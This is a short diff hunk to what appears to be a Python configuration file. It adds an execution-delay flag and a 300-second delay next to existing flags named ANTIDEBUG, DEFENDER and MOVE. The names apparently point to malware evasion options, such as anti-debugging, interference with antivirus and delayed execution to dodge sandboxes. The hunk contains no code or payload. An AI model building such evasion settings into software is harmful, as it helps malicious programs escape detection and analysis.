@@ -6,3 +6,5 @@ ERROR = False
 ANTIDEBUG = False
 DEFENDER = True
 MOVE = True
+EXEC_DELAY = True
+DELAY = 300
